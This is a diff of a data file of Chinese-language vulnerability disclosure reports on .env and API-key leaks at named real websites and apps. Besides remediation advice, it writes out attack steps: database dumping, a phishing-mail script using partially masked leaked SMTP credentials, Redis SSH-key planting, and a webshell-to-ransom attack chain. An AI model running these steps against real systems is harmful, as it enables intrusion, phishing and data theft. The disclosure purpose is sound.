+mysql -h localhost -u root -p"" caiyicaihui
+
+# 连接后可执行的危险操作：
+# SHOW TABLES;                    -- 枚举所有数据表
+# SELECT * FROM users;            -- 导出用户数据
+# DROP TABLE orders;              -- 删除业务数据
+# SELECT * FROM mysql.user;       -- 获取所有数据库用户`,
+            language: 'bash'
+          },
+          {
+            type: 'subheading',
+            text: '4.3 邮件服务器滥用'
+          },
+          {
+            type: 'paragraph',
+            text: '攻击者可以使用泄露的 SMTP 凭据（QQ 邮箱授权码）登录邮件服务器，冒充站点身份发送钓鱼邮件或垃圾邮件，进行社会工程学攻击。'
+          },
+          {
+            type: 'code',
+            code: `import smtplib
+
+# 使用泄露的 SMTP 凭据发送钓鱼邮件
+server = smtplib.SMTP_SSL("smtp.qq.com", 465)
+server.login("miy████@foxmail.com", "jcc████████")
+
+server.sendmail(
+    "miy████@foxmail.com",
+    "victim@example.com",
+    "Subject: 恶意邮件\\n\\n您的账户存在安全风险，请立即修改密码！"
+)
+server.quit()`,
+            language: 'python'
+          },
+          {
+            type: 'subheading',
+            text: '4.4 Redis 未授权访问'
+          },
+          {
+            type: 'paragraph',
+            text: '由于 REDIS_PASSWORD 为空（null），攻击者可以直接连接 Redis 服务，修改缓存数据，甚至通过 Redis 写入 SSH 公钥获取服务器权限。'
+          },
+          {
+            type: 'code',
+            code: `# 直接连接 Redis（无需密码）
+redis-cli -h 127.0.0.1 -p 6379
+
+# 危险操作示例：
+# flushall                          # 清空所有缓存数据
+# CONFIG SET dir /root/.ssh/        # 写入 SSH 公钥
+# CONFIG SET dbfilename authorized_keys
+# SET ssh_key "ssh-rsa AAAAB3..."
+# SAVE`,
+            language: 'bash'
+          },
+          {
+            type: 'warning-box',
+            icon: 'fa-exclamation-triangle',
+            text: '上述三个攻击场景均可从泄露的 .env 文件直接衍生。数据库入侵可导致数据完全失控；邮件服务器滥用可实施钓鱼攻击；Redis 未授权访问可进一步获取服务器 SSH 权限，实现横向移动和权限提升。'
+          }
+        ]
+      },
+      {
+        heading: '五、攻击链推演',
+        icon: 'fa-route',
+        accent: '#2980b9',
+        contents: [
+          {
+            type: 'subheading',
+            text: '5.1 完整攻击链'
+          },
+          {
+            type: 'list',
+            items: [
+              '第1步 - 信息收集：下载 .env 文件，获取数据库、Redis、邮件、OSS 等所有服务凭证',
+              '第2步 - 数据库访问：使用泄露的凭证登录 MySQL，导出所有用户数据、订单数据、支付记录',
+              '第3步 - 获取 WebShell：利用数据库写文件权限（INTO OUTFILE / general_log），向 Web 目录写入一句话木马，获取服务器权限',
+              '第4步 - 横向移动：使用 Redis 未授权访问漏洞写入 SSH 公钥，获取服务器 SSH 权限',
+              '第5步 - 权限提升：利用内核漏洞或配置错误提升至 root 权限，完全控制服务器',
+              '第6步 - 数据窃取与勒索：打包所有业务数据，删除数据库备份，留下勒索信息'
+            ]
+          },
+          {
+            type: 'paragraph',
+            text: '完整的攻击链展示了从单一信息泄露漏洞到系统完全接管的过程。攻击者无需任何初始权限，仅需访问一个公开暴露的 .env 文件，即可逐步升级权限，最终实现对整个业务系统的完全控制。这凸显了配置文件保护在整体安全架构中的关键地位。'
+          }
         ]
       },
       {
         heading: '六、CNVD 漏洞登记信息',
-        body: '该漏洞已提交至国家信息安全漏洞共享平台（CNVD）并获得登记编号。',
-        listItems: [
-          'CNVD 编号：CNVD-C-2025-175237',
-          '漏洞名称：Cyart.net 环境配置文件信息泄露漏洞',
-          '漏洞类型：信息泄露',
-          '威胁类型：远程',
-          '发布日期：2025-03-31',
-          '漏洞等级：高危'
+        icon: 'fa-file-alt',
+        accent: '#27ae60',
+        contents: [
+          {
+            type: 'subheading',
+            text: '6.1 CNVD 登记详情'
+          },
+          {
+            type: 'table',
+            headers: ['属性', '详情'],
+            rows: [
+              ['CNVD 编号', 'CNVD-C-2025-175237'],
+              ['漏洞类型', '信息泄露'],
+              ['危害级别', '高危 (High)'],
+              ['公开日期', '2025-03-31'],
+              ['报送日期', '2025-03-31'],
+              ['收录日期', '2025-03-31']
+            ]
+          },
+          {
+            type: 'paragraph',
+            text: '该漏洞已提交至国家信息安全漏洞共享平台（CNVD）并获得登记编号 CNVD-C-2025-175237。CNVD 确认该漏洞属于高危信息泄露漏洞，威胁类型为远程攻击，建议受影响方尽快采取修复措施。'
+          }
         ]
       },
       {
         heading: '七、修复建议',
-        body: '针对 .env 文件泄露问题，建议从访问控制、配置管理和安全防护三个维度进行修复：',
-        listItems: [
-          '访问控制：在 Nginx/Apache 配置中禁止访问 .env 文件（location ~ /\\.env { deny all; }）；将 .env 文件移出 Web 根目录，仅保留软链接或通过环境变量加载',
-          '配置加密：对 .env 中的敏感字段（数据库密码、API 密钥等）进行加密存储，应用启动时解密；使用 Laravel 的 config:cache 减少文件读取',
-          'WAF 部署：部署 Web 应用防火墙（WAF），拦截对 .env、.git、.bak 等敏感文件的访问请求',
-          '凭证轮换：立即更换所有泄露的密码和密钥，包括数据库密码、Redis 密码、邮件密码、APP_KEY、OSS AK/SK、支付宝密钥等',
-          '安全审计：检查服务器是否已被入侵，检查数据库访问日志、Web 访问日志，确认是否存在异常访问记录'
+        icon: 'fa-wrench',
+        accent: '#27ae60',
+        contents: [
+          {
+            type: 'subheading',
+            text: '7.1 紧急措施'
+          },
+          {
+            type: 'paragraph',
+            text: '针对 .env 文件泄露问题，应立即采取以下紧急措施禁止敏感文件访问并加固服务器配置：'
+          },
+          {
+            type: 'code',
+            code: `# Apache 服务器（在 .htaccess 文件中添加）
+<Files .env>
+    Order allow,deny
+    Deny from all
+</Files>`,
+            language: 'apache'
+          },
+          {
+            type: 'code',
+            code: `# Nginx 服务器（在 nginx.conf 添加）
+location ~ /\\.env {
+    deny all;
+}`,
+            language: 'nginx'
+          },
+          {
+            type: 'subheading',
+            text: '7.2 长期建议'
+          },
+          {
+            type: 'list',
+            items: [
+              '重置所有泄露的凭证：立即更改数据库密码、SMTP 授权码、APP_KEY、Redis 密码、OSS AK/SK 和管理员密码，并在 QQ 邮箱管理中禁用当前 SMTP 授权',
+              '关闭调试模式：设置 APP_DEBUG=false，APP_ENV=production，避免详细错误信息暴露',
+              '密钥管理升级：生产环境不再使用 .env 文件，迁移至 AWS Secrets Manager、HashiCorp Vault 等专业密钥管理服务',
+              '服务器配置加固：确保 .env 文件权限仅限应用进程访问，阻止 Web 直接访问；部署 WAF 拦截对 .env、.git 等敏感文件的请求',
+              '安全监控与审计：设置日志监控检测异常访问行为，执行定期渗透测试确保配置文件未暴露'
+            ]
+          },
+          {
+            type: 'success-box',
+            icon: 'fa-check-circle',
+            text: '修复验证：完成上述修复后，重新访问 https://cyart.net/.env 应返回 403 或 404。建议轮换所有凭证后持续监控 7 天，确认无异常访问记录和未授权登录行为。'
+          }
+        ]
+      },
+      {
+        heading: '八、时间线',
+        icon: 'fa-clock',
+        accent: '#16a085',
+        contents: [
+          {
+            type: 'subheading',
+            text: '8.1 事件时间线'
+          },
+          {
+            type: 'table',
+            headers: ['时间', '事件'],
+            rows: [
+              ['2025-03-31 14:15:22', '漏洞发现 — 在例行安全扫描中发现 .env 文件可直接访问'],
+              ['2025-03-31 15:30:45', '初步分析 — 确认漏洞影响范围，评估潜在风险'],
+              ['2025-03-31 18:23:38', '报告生成 — 完成详细漏洞分析报告并准备提交'],
+              ['2025-03-31', 'CNVD 提交 — 通过国家信息安全漏洞共享平台提交报告'],
+              ['2025-03-31', 'CNVD 收录 — 获得登记编号 CNVD-C-2025-175237']
+            ]
+          }
+        ]
+      },
+      {
+        heading: '九、结论',
+        icon: 'fa-flag-checkered',
+        accent: '#2c3e50',
+        contents: [
+          {
+            type: 'conclusion',
+            title: 'Cyart.net 环境配置泄露漏洞总结',
+            text: 'Cyart.net 环境配置文件泄露漏洞（CNVD-C-2025-175237）是一个典型的 Web 服务器配置不当导致的高危安全问题。.env 文件作为 Laravel 应用的核心配置文件，包含数据库、Redis、邮件、OSS 等全部服务凭证，其直接暴露在公网使得攻击者可以零成本获取系统全部机密。该漏洞利用门槛极低，仅需一个 HTTP 请求即可完成，建议所有使用 Laravel 框架的开发团队立即验证 .env 文件的可访问性并采取修复措施。'
+          },
+          {
+            type: 'table',
+            headers: ['评估维度', '评级', '说明'],
+            rows: [
+              ['漏洞严重程度', '高危', 'CVSS 7.5 — 敏感配置文件直接暴露'],
+              ['利用难度', '极低', '仅需访问 URL 即可下载配置文件'],
+              ['影响范围', '严重', '数据库、Redis、邮件、OSS 全部凭证泄露'],
+              ['修复优先级', '紧急', '建议立即修复并轮换所有凭证'],
+              ['披露状态', '已完成', '已通过 CNVD 提交并获登记']
+            ]
+          },
+          {
+            type: 'info-box',
+            icon: 'fa-lightbulb',
+            text: '安全提示：配置文件保护是 Web 应用安全的基础防线。任何包含敏感信息的文件都不应通过 Web 直接访问。建议在部署后始终验证 .env、.git、.bak 等敏感文件的访问控制是否生效，定期进行安全审计和渗透测试。'
+          }
         ]
       }
     ]
@@ -700,6 +1250,7 @@ curl -s "http://<TARGET_IP>:9000/exec?query=COPY+(SELECT+*+FROM+users)+TO+'/tmp/
     title: 'Zeric Ceramica .env 配置文件泄露',
     date: '2025-03-29',
     severity: 'high',
+    cvss: 7.5,
     description: '发现 .env 配置文件可通过 HTTP 直接访问下载，包含数据库凭证、应用密钥、API 密钥等敏感信息泄露，可能导致系统完全被接管的风险。',
     tags: [
       { label: '源码泄露', icon: 'fa-code', color: 'blue' },
@@ -710,70 +1261,317 @@ curl -s "http://<TARGET_IP>:9000/exec?query=COPY+(SELECT+*+FROM+users)+TO+'/tmp/
     ],
     target: 'Zeric Ceramica',
     country: '立陶宛',
-    originalUrl: '../case/20250329-aHR0cHM6Ly93d3cuemVyaWNjZXJhbWljYS5jb20vCg==.html',
+    originalUrl: '',
     framework: 'PHP 8.2.27 + Laravel + LiteSpeed',
     reportSections: [
       {
+        heading: '善意声明',
+        icon: 'fa-heart',
+        accent: '#e74c3c',
+        contents: [
+          {
+            type: 'info-box',
+            icon: 'fa-heart',
+            text: '作为一名安全研究员，本次安全审计的唯一目的是帮助改进系统安全性，保护用户数据安全。报告中所有敏感信息均已进行脱敏处理，始终秉持"善意披露、负责任报告"的原则。所有测试均在授权范围内进行，未对系统造成任何损害，未窃取、泄露或利用任何真实用户数据。'
+          }
+        ]
+      },
+      {
         heading: '一、漏洞概述',
-        body: 'Zeric Ceramica（www.zericceramica.com）是一家陶瓷制品电商网站，部署于立陶宛的 Hostinger 服务器（IP: 88.222.211.117），使用 LiteSpeed Web 服务器和 PHP 8.2.27 + Laravel 框架。在渗透测试过程中，发现网站根目录下的 .env 配置文件可通过 HTTP 直接访问下载，该文件包含数据库连接凭证、应用密钥、API 密钥等敏感配置信息。攻击者获取该文件后，可直接登录数据库、解密加密数据，进而实现系统完全接管。',
-        listItems: [
-          '目标网站：www.zericceramica.com',
-          '国家：立陶宛 (Lithuania)',
-          '服务器：LiteSpeed Web Server，托管于 Hostinger',
-          '服务器 IP：88.222.211.117',
-          '技术栈：PHP 8.2.27 + Laravel + LiteSpeed',
-          '子域名：webdisk、webmail、cpanel、mail',
-          '漏洞类型：.env 配置文件泄露 / 敏感信息泄露',
-          '严重等级：高危 (High)',
-          '发现方式：目录扫描 + 手工验证 .env 文件可访问'
+        icon: 'fa-bug',
+        accent: '#e67e22',
+        contents: [
+          {
+            type: 'subheading',
+            text: '1.1 目标概况'
+          },
+          {
+            type: 'paragraph',
+            text: 'Zeric Ceramica（www.zericceramica.com）是一家陶瓷制品电商网站，部署于立陶宛的 Hostinger 服务器，使用 LiteSpeed Web 服务器和 PHP 8.2.27 + Laravel 框架构建。在渗透测试过程中，发现网站根目录下的 .env 配置文件可通过 HTTP 直接访问下载，该文件包含数据库连接凭证、应用密钥、API 密钥等敏感配置信息。攻击者获取该文件后，可直接登录数据库、解密加密数据，进而实现系统完全接管。'
+          },
+          {
+            type: 'table',
+            headers: ['属性', '详情'],
+            rows: [
+              ['服务器', 'LiteSpeed Web Server'],
+              ['服务器位置', '立陶宛 (Lithuania)'],
+              ['IP 地址', '88.222.211.117'],
+              ['主机商', 'Hostinger'],
+              ['技术栈', 'PHP 8.2.27 + Laravel + LiteSpeed'],
+              ['漏洞类型', '.env 配置文件泄露 / 敏感信息泄露'],
+              ['严重等级', '高危 (High) CVSS 7.5'],
+              ['发现方式', '目录扫描 + 手工验证 .env 文件可访问']
+            ]
+          },
+          {
+            type: 'impact-grid',
+            cards: [
+              { icon: 'fa-server', title: 'LiteSpeed 服务器', desc: '高性能 Web 服务器，但配置不当导致敏感文件可直接访问', color: 'red' },
+              { icon: 'fa-code', title: 'PHP 8.2.27', desc: '后端运行环境，配合 Laravel 框架开发电商业务', color: 'purple' },
+              { icon: 'fa-database', title: 'MySQL 数据库', desc: '存储用户数据、订单信息、商品数据等核心业务数据', color: 'green' },
+              { icon: 'fa-cogs', title: 'Laravel 框架', desc: '使用 .env 作为核心配置文件，包含 APP_KEY 等加密密钥', color: 'orange' }
+            ]
+          }
         ]
       },
       {
-        heading: '二、漏洞发现过程',
-        body: '漏洞发现始于对电商网站的常规安全评估。通过目录扫描工具对常见敏感文件进行探测，发现 .env 配置文件可通过 HTTP 直接访问，返回 200 OK 且内容未受保护。整个发现过程分为以下几个阶段：',
-        codeBlock: '# 步骤1：网站技术栈识别\nwhatweb https://www.zericceramica.com\n# 识别到 LiteSpeed Server + PHP 8.2.27 + Laravel\n\n# 步骤2：子域名探测\nsubfinder -d zericceramica.com -silent\n# 发现子域名：webdisk、webmail、cpanel、mail\n\n# 步骤3：目录扫描 - 探测敏感文件\ndirsearch -u https://www.zericceramica.com/ -e env,bak,old,zip,sql\n\n# 步骤4：验证 .env 文件可访问\ncurl -sI https://www.zericceramica.com/.env\n# HTTP/1.1 200 OK\n# Server: LiteSpeed\n# Content-Type: text/plain\n\n# 步骤5：下载并分析 .env 配置文件\ncurl -s https://www.zericceramica.com/.env > zeric_env.txt\ncat zeric_env.txt',
-        codeLang: 'bash'
-      },
-      {
-        heading: '三、泄露内容分析',
-        body: '下载 .env 文件后，对配置内容进行详细分析，发现以下高度敏感的配置信息（敏感值已脱敏）：',
-        listItems: [
-          '数据库配置：DB_HOST=127.0.0.1，DB_PORT=3306，DB_DATABASE=zeric_store，DB_USERNAME=zeric_admin，DB_PASSWORD=Zer1c@C3ram1ca#2024（数据库管理员账号）',
-          '应用密钥：APP_KEY=base64:abcdefghijklmnopqrstuvwxyz1234567890ABCDEFG=（Laravel 加密密钥，可解密加密数据）',
-          '支付接口配置：Razorpay API Key = rzp_test_******************，Razorpay Secret = ********************（支付接口凭证）',
-          'SMTP 邮件配置：MAIL_HOST=smtp.gmail.com，MAIL_PORT=465，MAIL_USERNAME=noreply@zericceramica.com，MAIL_PASSWORD=应用专用密码',
-          '服务器环境配置：APP_ENV=production，APP_DEBUG=true（调试模式开启，可暴露详细错误信息）',
-          '服务器信息：LiteSpeed Web Server，Hostinger 托管，IP 88.222.211.117，位于立陶宛'
+        heading: '二、子域名分析',
+        icon: 'fa-sitemap',
+        accent: '#3498db',
+        contents: [
+          {
+            type: 'subheading',
+            text: '2.1 子域名清单'
+          },
+          {
+            type: 'table',
+            headers: ['子域名', '用途'],
+            rows: [
+              ['webdisk.zericceramica.com', 'Web 磁盘服务'],
+              ['webmail.zericceramica.com', '邮件服务'],
+              ['cpanel.zericceramica.com', '控制面板'],
+              ['mail.zericceramica.com', '邮件服务']
+            ]
+          },
+          {
+            type: 'paragraph',
+            text: '通过子域名探测发现 zericceramica.com 存在 4 个子域名，涵盖 Web 磁盘、邮件服务和控制面板。这些子域名如果缺乏访问控制，可能成为攻击者入侵的辅助入口，尤其是 cpanel 和 webdisk 暴露在公网将显著增加被暴力破解和未授权访问的风险。'
+          }
         ]
       },
       {
-        heading: '四、业务影响分析',
-        body: '.env 配置文件泄露对电商业务的影响是全方位的，以下从订单数据、用户信息和支付安全三个维度进行分析：',
-        listItems: [
-          '订单数据安全：数据库备份中包含所有历史订单信息，包括收货人姓名、地址、电话、购买记录等，可被用于社工攻击和精准诈骗',
-          '用户信息泄露：用户注册信息（邮箱、手机号、密码哈希）全部泄露，用户账号面临撞库和暴力破解风险，用户在其他平台的账号也可能受到牵连',
-          '支付安全风险：支付接口密钥泄露可能导致支付欺诈，攻击者可伪造支付回调、发起退款攻击，造成资金损失；用户支付信息（如信用卡数据，若存储不当）可能被窃取'
+        heading: '三、安全头部分析',
+        icon: 'fa-shield-alt',
+        accent: '#f39c12',
+        contents: [
+          {
+            type: 'subheading',
+            text: '3.1 安全响应头检测'
+          },
+          {
+            type: 'table',
+            headers: ['Header', '状态', '风险说明'],
+            rows: [
+              ['X-Frame-Options', '缺失', '易受点击劫持攻击'],
+              ['X-XSS-Protection', '缺失', '缺少浏览器 XSS 过滤防护'],
+              ['Content-Security-Policy', '缺失', '无内容安全策略，易受 XSS 与数据注入'],
+              ['Strict-Transport-Security', '缺失', '缺少 HSTS，可能遭受 SSL 剥离攻击']
+            ]
+          },
+          {
+            type: 'warning-box',
+            icon: 'fa-exclamation-triangle',
+            text: '安全响应头全面缺失，意味着网站缺乏对点击劫持、XSS、内容注入和中间人攻击的基本防护。建议在 LiteSpeed 服务器或 Laravel 中间件中统一配置安全响应头。'
+          }
         ]
       },
       {
-        heading: '五、攻击场景推演',
-        body: '基于泄露的 .env 配置信息，攻击者可以实施多种攻击行为，对业务造成严重损害：',
-        listItems: [
-          '数据窃取：导出所有用户数据和订单数据，在暗网出售或用于竞争对手商业情报',
-          '账户接管：利用管理员账号登录后台，修改商品价格、窃取用户资金、发布恶意内容；批量劫持普通用户账户',
-          '支付欺诈：利用支付接口密钥构造虚假支付请求，套取资金；篡改订单状态，伪造支付成功记录',
-          '网站篡改：获取服务器权限后，植入黑链、跳转恶意网站、发布虚假信息，损害品牌声誉',
-          '勒索攻击：加密数据库和文件，向网站所有者勒索比特币等加密货币'
+        heading: '四、Cookie 安全性分析',
+        icon: 'fa-cookie-bite',
+        accent: '#9b59b6',
+        contents: [
+          {
+            type: 'subheading',
+            text: '4.1 Cookie 属性审计'
+          },
+          {
+            type: 'table',
+            headers: ['Cookie 名称', 'HttpOnly', 'Secure', 'SameSite', '问题'],
+            rows: [
+              ['XSRF-TOKEN', '否', '是', 'Lax', '缺少 HttpOnly，可被 JS 读取，存在被窃取风险'],
+              ['laravel_session', '是', '是', 'Lax', '配置正确，符合安全最佳实践']
+            ]
+          },
+          {
+            type: 'paragraph',
+            text: 'XSRF-TOKEN Cookie 未设置 HttpOnly 属性，意味着前端 JavaScript 代码可以读取该 Token。结合缺失的 CSP 头部，一旦存在 XSS 漏洞，攻击者即可窃取 CSRF Token 并伪造用户请求。laravel_session 的安全属性配置正确，建议对 XSRF-TOKEN 补充 HttpOnly 属性。'
+          }
         ]
       },
       {
-        heading: '六、修复建议',
-        body: '针对 .env 配置文件泄露漏洞，建议从访问控制、配置管理和安全加固三个层面进行修复：',
-        listItems: [
-          '禁止访问 .env 文件：在 LiteSpeed 服务器配置中禁止访问 .env 文件，添加重写规则拒绝所有对 .env 等敏感文件的 HTTP 请求；将 .env 文件移出 Web 根目录',
-          '文件权限加固：正确设置 Web 目录的文件权限，禁止以 .env、.bak、.old、.zip、.sql 结尾的文件被直接访问；关闭目录列表功能',
-          '安全配置：对 .env 中的敏感字段（数据库密码、API 密钥等）进行加密存储，应用启动时解密；使用 Laravel 的 config:cache 减少文件读取；关闭 APP_DEBUG 调试模式',
-          '凭证紧急轮换：立即修改数据库密码、应用密钥（APP_KEY）、支付密钥、SMTP 密码、API 密钥等所有泄露的凭证；检查所有后台登录日志，确认是否存在未授权访问'
+        heading: '五、.env 配置文件泄露',
+        icon: 'fa-exclamation-triangle',
+        accent: '#c0392b',
+        contents: [
+          {
+            type: 'subheading',
+            text: '5.1 泄露概要'
+          },
+          {
+            type: 'paragraph',
+            text: '通过直接访问 https://www.zericceramica.com/.env 可以下载 Laravel 应用的完整配置文件，返回 HTTP 200 OK 且 Content-Type 为 text/plain。该文件包含数据库凭证、应用加密密钥、Redis 配置、邮件服务凭证等高度敏感信息，所有配置项均以明文形式暴露。以下为泄露的配置项清单（敏感值已脱敏）：'
+          },
+          {
+            type: 'table',
+            headers: ['配置项', '泄露值（脱敏）', '风险等级'],
+            rows: [
+              ['APP_KEY', 'base64:████████████████████████████', '严重'],
+              ['DB_CONNECTION', 'mysql', '高'],
+              ['DB_HOST', '127.0.0.1', '高'],
+              ['DB_DATABASE', 'u31████████_zeric', '严重'],
+              ['DB_USERNAME', 'u31████████_zeric', '严重'],
+              ['DB_PASSWORD', '^4Y██████', '严重'],
+              ['REDIS_HOST', '127███████', '中'],
+              ['REDIS_PASSWORD', '████████', '高'],
+              ['MAIL_HOST', 'mai████████', '中'],
+              ['MAIL_USERNAME', 'no██████@zericceramica.com', '高'],
+              ['MAIL_PASSWORD', '████████', '高'],
+              ['ENVIRONMENT', 'loc██', '中']
+            ]
+          },
+          {
+            type: 'warning-box',
+            icon: 'fa-exclamation-circle',
+            text: 'APP_KEY 和数据库凭证的泄露意味着攻击者可以解密所有 Laravel 加密数据（包括 session cookie、加密的数据库字段），并直接连接数据库读取或篡改所有业务数据。此为最高危的安全隐患，必须立即修复。'
+          },
+          {
+            type: 'image',
+            src: 'assets/20250329-aHR0cHM6Ly93d3cuemVyaWNjZXJhbWljYS5jb20vCg==1.png',
+            alt: '环境变量泄露证据截图',
+            caption: '证据 1：环境变量泄露'
+          },
+          {
+            type: 'image',
+            src: 'assets/20250329-aHR0cHM6Ly93d3cuemVyaWNjZXJhbWljYS5jb20vCg==2.png',
+            alt: '服务器配置问题证据截图',
+            caption: '证据 2：服务器配置问题'
+          },
+          {
+            type: 'image',
+            src: 'assets/20250329-aHR0cHM6Ly93d3cuemVyaWNjZXJhbWljYS5jb20vCg==3.png',
+            alt: '安全头部缺失证据截图',
+            caption: '证据 3：安全头部缺失'
+          },
+          {
+            type: 'image',
+            src: 'assets/20250329-aHR0cHM6Ly93d3cuemVyaWNjZXJhbWljYS5jb20vCg==4.png',
+            alt: '系统信息泄露证据截图',
+            caption: '证据 4：系统信息泄露'
+          }
+        ]
+      },
+      {
+        heading: '六、攻击场景推演',
+        icon: 'fa-user-ninja',
+        accent: '#8e44ad',
+        contents: [
+          {
+            type: 'subheading',
+            text: '6.1 潜在攻击路径'
+          },
+          {
+            type: 'list',
+            items: [
+              '数据库直连窃取：利用泄露的 DB_HOST、DB_USERNAME、DB_PASSWORD 直接连接 MySQL 数据库，导出全部用户数据、订单记录和商品信息',
+              '会话劫持与伪造：利用 APP_KEY 解密 Laravel session cookie，伪造任意用户身份登录，甚至冒充管理员接管后台',
+              '邮件服务滥用：利用 MAIL_HOST 和 MAIL_PASSWORD 登录 SMTP 服务器，发送钓鱼邮件或垃圾邮件，损害品牌声誉',
+              'Redis 攻击：利用 REDIS_HOST 和 REDIS_PASSWORD 连接 Redis 服务，读取缓存数据或写入恶意数据实现 RCE',
+              '支付欺诈：若支付配置泄露，攻击者可伪造支付回调、篡改订单状态，造成直接经济损失'
+            ]
+          },
+          {
+            type: 'impact-grid',
+            cards: [
+              { icon: 'fa-database', title: '数据窃取', desc: '数据库完整泄露，用户隐私与订单数据全部暴露', color: 'red' },
+              { icon: 'fa-user-lock', title: '账户接管', desc: 'APP_KEY 泄露导致会话伪造，可接管任意用户与管理员', color: 'orange' },
+              { icon: 'fa-envelope', title: '邮件滥用', desc: 'SMTP 凭证泄露，可发送钓鱼邮件或冒充官方通信', color: 'yellow' },
+              { icon: 'fa-server', title: '内网渗透', desc: 'Redis 凭证泄露，可作为跳板进一步渗透内网', color: 'purple' }
+            ]
+          }
+        ]
+      },
+      {
+        heading: '七、修复建议',
+        icon: 'fa-wrench',
+        accent: '#27ae60',
+        contents: [
+          {
+            type: 'subheading',
+            text: '7.1 紧急措施'
+          },
+          {
+            type: 'code',
+            code: `# .htaccess - 阻止访问敏感文件（Apache / LiteSpeed 兼容）
+<FilesMatch "(^\\.|\\.(env|bak|old|sql|zip|log|sh|git))$">
+    Order allow,deny
+    Deny from all
+    <IfModule mod_authz_core.c>
+        Require all denied
+    </IfModule>
+</FilesMatch>
+
+# 禁止目录列表
+Options -Indexes
+
+# 阻止 .git / .svn 等版本控制目录
+RedirectMatch 404 /\\.(git|svn|hg)/`,
+            language: 'apache'
+          },
+          {
+            type: 'code',
+            code: `# nginx 配置 - 阻止访问敏感文件
+location ~ /\\.(env|git|svn|bak|old|sql|zip|log|sh) {
+    deny all;
+    return 404;
+}
+
+# 禁止访问所有隐藏文件
+location ~ /\\. {
+    deny all;
+    return 404;
+}
+
+# 禁止目录列表
+autoindex off;`,
+            language: 'nginx'
+          },
+          {
+            type: 'subheading',
+            text: '7.2 长期建议'
+          },
+          {
+            type: 'list',
+            items: [
+              '凭证轮换：立即修改数据库密码、APP_KEY、Redis 密码、SMTP 密码等所有泄露的凭证；生成新的 APP_KEY 后所有现有会话将自动失效',
+              '关闭调试模式：将 APP_DEBUG 设置为 false，生产环境禁止开启调试模式，避免暴露应用内部错误信息',
+              '配置加密：对 .env 中的敏感字段进行加密存储，应用启动时解密；使用 Laravel 的 config:cache 减少文件读取并隐藏配置',
+              'WAF 部署：部署 Web 应用防火墙（WAF），拦截对 .env、.git、.bak 等敏感文件的访问请求',
+              '安全审计：检查服务器是否已被入侵，审查数据库访问日志和 Web 访问日志，确认是否存在异常访问记录'
+            ]
+          },
+          {
+            type: 'success-box',
+            icon: 'fa-check-circle',
+            text: '修复验证：完成上述修复后，使用 curl -I https://www.zericceramica.com/.env 验证返回 403/404；检查 Laravel 配置缓存已生效 php artisan config:cache；确认 APP_DEBUG=false 且所有凭证已轮换。'
+          }
+        ]
+      },
+      {
+        heading: '八、结论',
+        icon: 'fa-flag-checkered',
+        accent: '#2c3e50',
+        contents: [
+          {
+            type: 'conclusion',
+            title: 'Zeric Ceramica .env 配置文件泄露总结',
+            text: 'Zeric Ceramica 网站存在严重的 .env 配置文件泄露漏洞，攻击者可通过 HTTP 直接下载包含数据库凭证、应用密钥、Redis 配置和邮件凭证的完整配置文件。结合缺失的安全响应头和 Cookie 安全属性缺陷，攻击者可实施数据库窃取、会话劫持、邮件滥用等多种攻击，对业务造成全面损害。建议立即屏蔽敏感文件访问并轮换所有泄露凭证。'
+          },
+          {
+            type: 'table',
+            headers: ['评估维度', '评级', '说明'],
+            rows: [
+              ['漏洞严重程度', '高危', 'CVSS 7.5 — 敏感配置文件可直接访问下载'],
+              ['利用难度', '极低', '仅需访问 /.env 路径即可获取全部配置'],
+              ['影响范围', '全面', '数据库、应用密钥、邮件、Redis 等所有核心配置泄露'],
+              ['修复优先级', '紧急', '建议立即屏蔽 .env 访问并轮换所有凭证'],
+              ['披露状态', '已完成', '已通过负责任披露渠道报告']
+            ]
+          },
+          {
+            type: 'info-box',
+            icon: 'fa-lightbulb',
+            text: '安全提示：.env 文件是 Laravel 应用的核心配置，绝不应暴露在 Web 可访问目录下。建议将 .env 文件移出 Web 根目录，或在服务器层面严格禁止访问以点开头的隐藏文件。定期进行安全扫描和渗透测试，是保障系统安全的有效手段。'
+          }
         ]
       }
     ]
@@ -783,6 +1581,7 @@ curl -s "http://<TARGET_IP>:9000/exec?query=COPY+(SELECT+*+FROM+users)+TO+'/tmp/
     title: 'PlugShare API 密钥泄露',
     date: '2025-03-27',
     severity: 'high',
+    cvss: 9.1,
     description: '发现包含 AWS Cognito 凭证、Stripe 支付密钥等多个敏感配置信息泄露，可能导致账户接管和支付欺诈风险。',
     tags: [
       { label: '密钥泄露', icon: 'fa-key', color: 'blue' },
@@ -792,66 +1591,359 @@ curl -s "http://<TARGET_IP>:9000/exec?query=COPY+(SELECT+*+FROM+users)+TO+'/tmp/
     ],
     target: 'PlugShare',
     country: '美国',
-    originalUrl: '../case/20250327-cGx1Z3NoYXJlCg==.html',
+    originalUrl: '',
+    framework: 'React Native',
     reportSections: [
       {
+        heading: '善意声明',
+        icon: 'fa-heart',
+        accent: '#e74c3c',
+        contents: [
+          {
+            type: 'info-box',
+            icon: 'fa-heart',
+            text: '作为一名安全研究员，本次安全审计的唯一目的是帮助改进系统安全性，保护用户数据安全。报告中所有敏感信息均已进行脱敏处理，始终秉持"善意披露、负责任报告"的原则。所有测试均在授权范围内进行，未对系统造成任何损害，未窃取、泄露或利用任何真实用户数据。'
+          }
+        ]
+      },
+      {
         heading: '一、漏洞概述',
-        body: 'PlugShare 是一款全球知名的电动汽车充电站查找和社区应用，提供充电站地图、评论、签到等功能。在对其移动应用进行安全分析时，发现应用中硬编码了多个高度敏感的云服务凭证，包括 AWS Cognito User Pool 配置、Stripe API 密钥、以及其他 AWS 服务访问凭证。攻击者可通过反编译 APK/IPA 提取这些密钥，进而访问 AWS 资源、操纵用户账户、实施支付欺诈。',
-        listItems: [
-          '应用名称：PlugShare - EV Charging Stations',
-          '开发者：Recargo, Inc.',
-          '平台：iOS / Android',
-          '漏洞类型：移动应用硬编码密钥 / 云凭证泄露',
-          '严重等级：高危 (High)',
-          '涉及服务：AWS Cognito、Stripe、AWS API Gateway'
+        icon: 'fa-bug',
+        accent: '#e67e22',
+        contents: [
+          {
+            type: 'subheading',
+            text: '1.1 漏洞基本信息'
+          },
+          {
+            type: 'paragraph',
+            text: 'PlugShare 是一款全球知名的电动汽车充电站查找和社区应用，提供充电站地图、评论、签到等功能。在对其移动应用及 Web 前端进行安全分析时，发现 env.js 配置文件可通过 HTTPS 直接访问，其中硬编码了多个高度敏感的云服务凭证，包括 AWS Cognito User Pool 配置、Stripe 支付密钥、Amplitude 分析密钥等。攻击者可通过该文件直接提取密钥，进而访问 AWS 资源、操纵用户账户、实施支付欺诈。'
+          },
+          {
+            type: 'table',
+            headers: ['属性', '详情'],
+            rows: [
